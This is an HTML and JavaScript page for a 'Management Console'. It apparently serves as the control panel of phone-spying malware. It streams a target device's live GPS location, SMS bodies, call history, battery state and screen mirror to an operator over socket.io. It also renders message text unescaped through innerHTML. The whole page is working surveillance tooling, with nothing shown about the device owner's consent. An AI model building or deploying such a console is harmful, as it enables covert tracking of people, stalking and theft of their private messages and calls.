<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Management Console</title>
    <script src="/socket.io/socket.io.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        :root { --sidebar-bg: #2c3e50; --accent: #1abc9c; --dark: #34495e; }
        body { font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; background: #f4f7f6; height: 100vh; overflow: hidden; }
        
        /* Sidebars */
        .sidebar { width: 250px; background: var(--sidebar-bg); color: white; height: 100vh; position: fixed; z-index: 10; }
        .screen-dock { width: 320px; background: #111; height: 100vh; position: fixed; right: 0; border-left: 4px solid var(--dark); display: flex; flex-direction: column; align-items: center; }
        
        .nav-item { padding: 15px 20px; cursor: pointer; border-bottom: 1px solid #3e4f5f; }
        .nav-item:hover, .active { background: #1a252f; color: var(--accent); }

        .main-content { margin-left: 250px; margin-right: 320px; flex: 1; display: flex; flex-direction: column; }
        
        /* Mirroring Window */
        #screen-container { width: 280px; height: 580px; background: #000; margin-top: 20px; border-radius: 30px; border: 8px solid #333; overflow: hidden; position: relative; display: flex; align-items: center; justify-content: center; }
        #screen-img { width: 100%; height: auto; display: none; }
        .screen-placeholder { color: #555; text-align: center; padding: 20px; }

        .top-nav { height: 85px; background: white; display: flex; justify-content: space-between; align-items: center; padding: 0 30px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .view { display: none; padding: 25px; overflow-y: auto; flex: 1; }
        .view.active { display: block; }
        #map { height: 400px; width: 100%; border-radius: 12px; margin-top: 15px; }
        table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; }
        th { background: var(--dark); color: white; padding: 12px; text-align: left; }
        td { padding: 12px; border-bottom: 1px solid #eee; }
    </style>
</head>
<body>

<div class="sidebar">
    <div style="padding:20px; background:var(--accent); font-weight:bold;">CONTROL PANEL</div>
    <div class="nav-item active" onclick="showView('dash')">üìä Dashboard</div>
    <div class="nav-item" onclick="showView('sms')">üí¨ SMS Messages</div>
    <div class="nav-item" onclick="showView('calls')">üìû Call History</div>
</div>

<div class="main-content">
    <div class="top-nav">
        <p id="addr-text" style="font-weight:bold;">üìç GPS Signal: Pending...</p>
        <div style="background:#d4efdf; padding:8px 15px; border-radius:20px; font-weight:bold;">
            üîã <span id="pct">--</span>% <span id="bolt" style="display:none;">‚ö°</span>
        </div>
    </div>

    <div id="dash" class="view active">
        <h2>Live Tracking</h2>
        <div id="map"></div>
    </div>

    <div id="sms" class="view">
        <h2>SMS Logs</h2>
        <table><thead><tr><th>Type</th><th>From/To</th><th>Message</th><th>Time</th></tr></thead><tbody id="sms-table"></tbody></table>
    </div>

    <div id="calls" class="view">
        <h2>Call History</h2>
        <table><thead><tr><th>Type</th><th>Name</th><th>Number</th><th>Duration</th><th>Time</th></tr></thead><tbody id="calls-table"></tbody></table>
    </div>
</div>

<div class="screen-dock">
    <div style="width:100%; padding:15px; background:var(--dark); color:white; text-align:center; font-size:12px;">SCREEN VIEW DOCK</div>
    <div id="screen-container">
        <div id="placeholder" class="screen-placeholder">Stream Inactive<br><small>Click Start Below</small></div>
        <img id="screen-img" src="" />
    </div>
    <div style="margin-top:20px; display:flex; gap:10px;">
        <button onclick="requestScreen()" style="background:var(--accent); border:none; padding:10px 15px; color:white; border-radius:5px; cursor:pointer;">Start Mirror</button>
        <button onclick="stopScreen()" style="background:#e74c3c; border:none; padding:10px 15px; color:white; border-radius:5px; cursor:pointer;">Stop</button>
    </div>
</div>

<script>
    const socket = io();
    let map, marker;

    function requestScreen() {
        socket.emit('request-screen-view');
        document.getElementById('placeholder').innerText = "Requesting Access...";
    }

    function stopScreen() {
        socket.emit('stop-mirroring');
        document.getElementById('screen-img').style.display = 'none';
        document.getElementById('placeholder').style.display = 'block';
    }

    socket.on('screen-status', (status) => {
        if(status === "OFF") alert("ALARM: The mobile screen is OFF. Mirroring cannot start.");
    });

    socket.on('ui-screen-stream', (base64) => {
        document.getElementById('placeholder').style.display = 'none';
        const img = document.getElementById('screen-img');
        img.style.display = 'block';
        img.src = "data:image/jpeg;base64," + base64;
    });

    socket.on('ui-battery', (data) => {
        document.getElementById('pct').innerText = data.percent;
        document.getElementById('bolt').style.display = data.charging ? "inline" : "none";
    });

    socket.on('ui-gps', (data) => {
        document.getElementById('addr-text').innerText = "üìç " + data.address;
        if (!map) {
            map = L.map('map').setView([data.lat, data.lng], 16);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        }
        if (marker) map.removeLayer(marker);
        marker = L.circleMarker([data.lat, data.lng], {radius: 8, color: '#fff', fillColor: '#3498db', fillOpacity: 1}).addTo(map);
        map.setView([data.lat, data.lng]);
    });

    socket.on('ui-sms-display', (data) => {
        document.getElementById('sms-table').innerHTML = data.map(m => `<tr><td>${m.type}</td><td>${m.address}</td><td>${m.body}</td><td>${new Date(m.date).toLocaleString()}</td></tr>`).join('');
    });

    socket.on('ui-calls-display', (data) => {
        document.getElementById('calls-table').innerHTML = data.map(c => `<tr><td>${c.type}</td><td>${c.name||'Unknown'}</td><td>${c.number}</td><td>${c.duration}</td><td>${new Date(c.date).toLocaleString()}</td></tr>`).join('');
    });

    function showView(id) {
        document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
        document.getElementById(id).classList.add('active');
        if(id === 'sms') socket.emit('get-sms-request');
        if(id === 'calls') socket.emit('get-calls-request');
    }
</script>
</body>
</html>
